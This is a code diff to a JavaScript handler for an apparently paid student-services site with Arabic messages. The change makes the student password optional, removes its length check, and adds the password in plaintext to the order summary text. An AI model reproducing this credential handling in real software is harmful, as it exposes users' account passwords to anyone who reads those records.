@@ -271,7 +271,7 @@ async function handleTrack(request, env) {
     return json({ ok: false, message: "طريقة الطلب غير مدعومة." }, 405);
   }
   if (trackRateLimited(request)) {
-    return json({ ok: false, message: "محاولات كثيرة. انتظر دقيقة ثم حاول مرة أخرى." }, 429);
+    return json({ ok: false, message: "محاولات كثيرة. انتظر دقيقة ثم حاول مجددًا." }, 429);
   }
   if (!requireStorage(env)) {
     return json({ ok: false, message: "خدمة المتابعة غير متاحة حاليًا." }, 503);
@@ -309,6 +309,7 @@ async function handleTrack(request, env) {
     }
   }, 200, { "cache-control": "no-store, private" });
 }
+
 async function handleSubmit(request, env) {
   if (request.method !== "POST") return json({ ok: false, message: "طريقة الطلب غير مدعومة." }, 405);
   if (isRateLimited(request)) return json({ ok: false, message: "انتظر قليلًا قبل المحاولة مرة أخرى." }, 429);
@@ -330,7 +331,7 @@ async function handleSubmit(request, env) {
   const subject = data.get("subject");
   const phone = data.get("phone");
   const studentCode = data.get("studentCode");
-  const passwordInput = data.get("password");
+  const passwordInput = data.get("password") || "";
   const consent = data.get("consent");
   const paymentMethod = data.get("paymentMethod");
   const senderPhone = data.get("senderPhone");
@@ -352,11 +353,11 @@ async function handleSubmit(request, env) {
     return json({ ok: false, message: "اختيارات الطلب غير صحيحة." }, 400);
   }
   if (consent !== "true") return json({ ok: false, message: "يجب تأكيد صحة البيانات أولًا." }, 400);
-  if ([phone, studentCode, passwordInput].some(value =>
-    typeof value !== "string" || !value.trim() || value.length > 100
-  )) {
-    return json({ ok: false, message: "تأكد من إدخال بيانات الطلب الأساسية." }, 400);
+  
+  if (!phone || !studentCode || typeof phone !== "string" || typeof studentCode !== "string" || !phone.trim() || !studentCode.trim()) {
+    return json({ ok: false, message: "تأكد من إدخال رقم الهاتف وكود الطالب." }, 400);
   }
+
   if (!["InstaPay", "Vodafone Cash", "Telda"].includes(paymentMethod)) {
     return json({ ok: false, message: "اختار وسيلة دفع صحيحة." }, 400);
   }
@@ -392,6 +393,7 @@ async function handleSubmit(request, env) {
     "المبلغ المطلوب: " + amount + " جنيه",
     "رقم الطالب: " + phone,
     "كود الطالب: " + studentCode,
+    "باسوورد الطالب: " + (passwordInput.trim() || "غير متوفر"),
     "وسيلة الدفع: " + paymentMethod,
     "رقم الهاتف المُحوِّل: " + senderPhone,
     "الحالة: في انتظار مراجعة الدفع"
